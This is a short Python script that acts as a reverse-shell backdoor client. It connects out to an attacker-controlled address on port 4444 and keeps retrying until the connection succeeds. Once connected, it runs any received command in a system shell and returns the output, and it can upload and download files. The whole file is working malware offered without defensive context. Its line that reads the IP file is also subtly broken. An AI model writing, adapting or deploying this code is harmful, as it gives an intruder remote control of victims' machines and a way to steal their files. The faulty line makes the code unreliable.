import socket, time, json, subprocess, os

ATTACKER_IP = open("ip.txt").read().close()

def robust_send(data):
	jsondata = json.dumps(data)
	s.send(jsondata.encode())

def robust_recv():
	data = ''
	while True:
		try:
			data += s.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def connect():
		try:
			s.connect((ATTACKER_IP, 4444))
			shell()
			s.close()
		except:
			time.sleep(20)
			connect()

def upload(file):
	with open(file, "rb") as f:
		s.send(f.read())

def download(file):
	with open(file, "wb") as f:
		s.settimeout(1)
		chunk = s.recv(1024)
		while chunk:
			f.write(chunk)
			try:
				chunk = s.recv(1024)
			except socket.timeout:
				break
		s.settimeout(None)

def shell():
	while True:
		command = robust_recv()
		if command == "quit":
			break
		elif command.startswith("cd "):
			os.chdir(command[3:])
		elif command == "clear":
			pass
		elif command.startswith("download "):
			upload(command[9:])
		elif command.startswith("upload "):
			download(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			robust_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect()